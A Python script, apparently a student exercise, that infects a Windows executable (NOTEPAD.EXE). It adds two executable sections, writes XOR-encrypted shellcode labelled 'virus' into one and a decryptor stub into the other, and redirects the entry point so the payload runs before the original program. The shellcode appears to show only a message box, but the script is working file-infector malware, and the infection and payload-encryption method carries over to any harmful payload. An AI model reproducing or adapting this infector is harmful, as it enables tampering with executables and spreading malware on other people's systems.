import pefile
import os
import mmap
import struct

# Quick function to align our values
def align(val_to_align, alignment):
    return int((val_to_align + alignment - 1) / alignment) * alignment
    
#XOR
def bitwise_xor_bytes(a, b):
    result_int = list(struct.unpack(">i", a))[0] ^ list(struct.unpack(">i", b))[0]
    return struct.pack(">i", result_int)
    
'''----------------------------------ADD TWO SECTION----------------------------------'''
exe_path='NOTEPAD.EXE'

#******************add section .code******************

original_size = os.path.getsize(exe_path)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

# Look for valid values for the new section header
raw_size = align(0x200, file_alignment)
virtual_size = align(0x200, section_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

characteristics = 0xE0000020
name = ".code" + (3 * '\x00')
last_section = pe.sections[-1]
new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
new_section.__unpack__(bytearray(new_section.sizeof()))
new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

new_section.Name = name
new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = virtual_size
new_section.VirtualAddress = virtual_offset
new_section.SizeOfRawData = raw_size
new_section.PointerToRawData = raw_offset
new_section.PointerToRelocations = new_section.PointerToLinenumbers = new_section.NumberOfRelocations \
                                 = new_section.NumberOfLinenumbers = 0x0
new_section.Characteristics = characteristics

pe.sections.append(new_section)
pe.__structures__.append(new_section)


pe.FILE_HEADER.NumberOfSections += 1
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

exe_path='NOTEPAD2.EXE'
pe.write(exe_path)
pe = pefile.PE(exe_path)


#******************add section .virus******************

original_size = os.path.getsize(exe_path)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

raw_size = align(0x200, file_alignment)
virtual_size = align(0x200, section_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

characteristics = 0xE0000020

name = ".code" + (3 * '\x00')
last_section = pe.sections[-1]
new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
new_section.__unpack__(bytearray(new_section.sizeof()))
new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

new_section.Name = name
new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = virtual_size
new_section.VirtualAddress = virtual_offset
new_section.SizeOfRawData = raw_size
new_section.PointerToRawData = raw_offset
new_section.PointerToRelocations = new_section.PointerToLinenumbers = new_section.NumberOfRelocations \
                                 = new_section.NumberOfLinenumbers = 0x0
new_section.Characteristics = characteristics

pe.sections.append(new_section)
pe.__structures__.append(new_section)


pe.FILE_HEADER.NumberOfSections += 1
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

exe_path='NOTEPAD2.EXE'
pe.write(exe_path)
pe = pefile.PE(exe_path)

print(pe.sections[-2])
print(pe.sections[-1])
'''----------------------------------MODIFY SECTION .VIRUS----------------------------------'''
#Shellcode virus plaintext
virus = bytes(b"\xD9\xEB\x9B\xD9\x74\x24\xF4\x31\xD2\xB2\x77\x31\xC9\x64"
        b"\x8B\x71\x30\x8B\x76\x0C\x8B\x76\x1C\x8B\x46\x08\x8B\x7E"
        b"\x20\x8B\x36\x38\x4F\x18\x75\xF3\x59\x01\xD1\xFF\xE1\x60"
        b"\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x54\x28\x78\x01\xEA\x8B"
        b"\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34\x8B\x01"
        b"\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x07\xC1\xCF\x0D"
        b"\x01\xC7\xEB\xF4\x3B\x7C\x24\x28\x75\xE1\x8B\x5A\x24\x01"
        b"\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01"
        b"\xE8\x89\x44\x24\x1C\x61\xC3\xB2\x08\x29\xD4\x89\xE5\x89"
        b"\xC2\x68\x8E\x4E\x0E\xEC\x52\xE8\x9F\xFF\xFF\xFF\x89\x45"
        b"\x04\xBB\x7E\xD8\xE2\x73\x87\x1C\x24\x52\xE8\x8E\xFF\xFF"
        b"\xFF\x89\x45\x08\x68\x6C\x6C\x20\x41\x68\x33\x32\x2E\x64"
        b"\x68\x75\x73\x65\x72\x30\xDB\x88\x5C\x24\x0A\x89\xE6\x56"
        b"\xFF\x55\x04\x89\xC2\x50\xBB\xA8\xA2\x4D\xBC\x87\x1C\x24"
        b"\x52\xE8\x5F\xFF\xFF\xFF\x68\x33\x30\x58\x20\x68\x20\x4E"
        b"\x54\x32\x68\x6E\x20\x62\x79\x68\x63\x74\x69\x6F\x68\x49"
        b"\x6E\x66\x65\x31\xDB\x88\x5C\x24\x12\x89\xE3\x68\x33\x39"
        b"\x58\x20\x68\x35\x32\x31\x34\x68\x33\x2D\x31\x39\x68\x32"
        b"\x30\x31\x38\x68\x2D\x31\x39\x35\x68\x32\x33\x30\x37\x68"
        b"\x31\x39\x35\x32\x31\xC9\x88\x4C\x24\x1A\x89\xE1\x31\xD2"
        b"\x6A\x40\x53\x51\x52\xFF\xD0")

#Return to address of old entry point        
mov_eax_value = pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase
virus += b"\xB8" + struct.pack("<i", mov_eax_value)  + b"\xFF\xD0\x00\x00"
address = pe.sections[-1].VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
length_virus = 296

#XOR all plaintext of virus to ciphertext
cipher = b""
for i in range(74):
    a = virus[4*i:4*i+4]
    b = struct.pack("<i", address + 4*i)
    c = struct.pack("<i", length_virus)
    length_virus = length_virus - 4
    cipher += bitwise_xor_bytes(bitwise_xor_bytes(a,c),b)

#Write ciphertext virus to section .virus
raw_offset_virus = pe.sections[-1].PointerToRawData
pe.set_bytes_at_offset(raw_offset_virus, bytes(cipher))
pe.write(exe_path)
#print(pe.sections[-1].get_data())

'''----------------------------------MODIFY SECTION .CODE - DECRYPTOR----------------------------------'''
virtual_address_virus = pe.sections[-1].VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
#lea esi, virus
decryption = b"\x8D\x35" + struct.pack("<i", virtual_address_virus)
print(struct.pack("<i", virtual_address_virus))

#Decrypt cipher virus
decryption += b"\xB9\x28\x01\x00\x00\x31\x0E\x31\x36\x83\xC6\x04\x83\xE9\x04\x83\xF9\x00\x0F\x85\xED\xFF\xFF\xFF"

#Call virus after decrypted
call_offset_virus = pe.sections[-1].VirtualAddress - (pe.sections[-2].VirtualAddress + 0x1e) - 5 
decryption += b"\xE8" + struct.pack("<i", call_offset_virus)

#Write decryptor in section .code
raw_offset_code = pe.sections[-2].PointerToRawData
pe.set_bytes_at_offset(raw_offset_code, bytes(decryption))
pe.write(exe_path)
#print(pe.sections[-2].get_data())

'''----------------------------------CHANGE ADDRESS OF ENTRY POINT----------------------------------'''
new_ep = pe.sections[-2].VirtualAddress
oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
pe.write(exe_path)